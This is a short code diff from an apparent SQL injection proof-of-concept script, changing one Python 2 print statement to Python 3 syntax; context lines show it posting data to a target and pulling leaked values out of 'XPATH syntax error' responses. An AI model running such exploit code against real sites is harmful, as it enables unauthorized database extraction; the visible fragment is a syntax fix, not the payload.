@@ -24,7 +24,7 @@ def poc():
 		r = requests.post(url,cookies=cookie,data=postData)
 
 		p = re.compile("(?<=XPATH syntax error: \':)(.*)(?=\' <br)")
-		print "[*] The result: " + re.search(p,r.text).group(0)
+		print("[*] The result: " + re.search(p,r.text).group(0))
 		print("\033[33m[*] Complete this task: {} \033[0m".format(target.url))
 	except KeyError as e:
 		print("\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m")
